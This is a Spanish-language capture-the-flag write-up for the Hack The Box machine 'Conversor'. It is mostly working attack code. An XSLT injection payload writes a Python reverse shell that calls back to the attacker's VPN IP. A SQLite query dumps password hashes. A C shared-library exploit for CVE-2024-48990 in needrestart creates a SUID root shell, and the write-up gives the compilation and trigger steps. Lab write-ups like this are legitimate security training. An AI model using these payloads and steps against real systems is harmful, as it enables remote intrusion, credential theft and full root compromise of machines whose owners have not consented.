# Write-Up: Conversor - Hack The Box

**Fecha:** 18 de Diciembre 2025
**Dificultad:** Medium
**Servicio Clave:** HTTP (Flask), Cron, Needrestart
**Aprendizaje Principal:** XSLT File Write Injection y CVE-2024-48990 (Local Privilege Escalation).

## 1. Reconocimiento y Acceso Inicial
- **Problema:** El sitio requiere credenciales para acceder al conversor.
- **Solución:** Registro manual y login manipulando peticiones HTTP.
- **Comandos utilizados:**
  1. **Registro:** `curl -X POST -H "Host: conversor.htb" -d "username=text123&password=text123" -c cookies.txt http://10.10.11.92/register -i`
  2. **Login:** `curl -L -H "Host: conversor.htb" -b cookies.txt http://10.10.11.92/`
- **Hallazgo Crítico:** El código fuente (`app.py`) muestra que la librería `lxml` procesa archivos XSLT sin restricciones de seguridad, permitiendo la escritura de archivos en el disco.

## 2. Explotación (RCE)
- **Vulnerabilidad:** XSLT Injection (File Write).
- **Estrategia:** Escribir una reverse shell en `/var/www/conversor.htb/scripts/`, carpeta monitoreada por un cronjob que ejecuta todo lo que hay dentro.
- **Payload (ataque.xslt):**
  ```xml
  <xsl:stylesheet version="1.0" xmlns:xsl="[http://www.w3.org/1999/XSL/Transform](http://www.w3.org/1999/XSL/Transform)" xmlns:sax="[http://icl.com/saxon](http://icl.com/saxon)" extension-element-prefixes="sax">
    <xsl:template match="/">
      <sax:output href="/var/www/conversor.htb/scripts/shell.py" method="text">
  import socket,os,pty
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("TU_IP_VPN", 4444))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  pty.spawn("/bin/bash")
      </sax:output>
    </xsl:template>
  </xsl:stylesheet>

```
Movimiento Lateral (User: fismathack)
Objetivo: Obtener credenciales válidas del sistema.

Hallazgo: Base de datos SQLite en /var/www/conversor.htb/instance/users.db.

Comando de extracción:

Bash

sqlite3 /var/www/conversor.htb/instance/users.db "SELECT * FROM users;"
Resultado: Se obtuvieron hashes MD5. Tras crackearlos, se obtuvo la contraseña del usuario fismathack.

Acceso: ssh fismathack@10.10.11.92

User Flag: cat /home/fismathack/user.txt

3. Escalada de Privilegios (Root)
Vulnerabilidad: CVE-2024-48990. El binario needrestart (v3.7) ejecutado como root es vulnerable a la inyección de librerías mediante PYTHONPATH.

Exploit (Código C): Creamos el archivo exploit.c que generará una shell SUID:

C

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));
void inject() {
    // Al cargarse la librería, si somos root, creamos la backdoor
    if (geteuid() == 0) {
        system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
    }
}
Compilación y Preparación:

Bash

# 1. Compilar la librería maliciosa
gcc -fPIC -shared -o /tmp/libexploit.so exploit.c

# 2. Crear la estructura de carpetas para engañar a Python
mkdir -p /tmp/malicious/importlib
cp /tmp/libexploit.so /tmp/malicious/importlib/__init__.so
Ejecución del Ataque: Requerimos dos terminales SSH simultáneas:

Terminal 1 (El Cebo): Ejecutamos Python forzando el path malicioso.

Bash

PYTHONPATH="/tmp/malicious" python3 -c "import importlib, time; time.sleep(1000)"
Terminal 2 (El Disparador): Ejecutamos needrestart.

Bash

sudo /usr/sbin/needrestart
Resultado Final: El exploit crea el archivo /tmp/rootbash.

Bash

/tmp/rootbash -p
cat /root/root.txt
4. Resumen de Comandos Clave
Bash

# Escaneo de puertos
nmap -p- --min-rate 5000 10.10.11.92
# Conexión web
curl -X POST ...
# Shell Reversa
nc -lvnp 4444
# Persistencia SSH
ssh fismathack@10.10.11.92
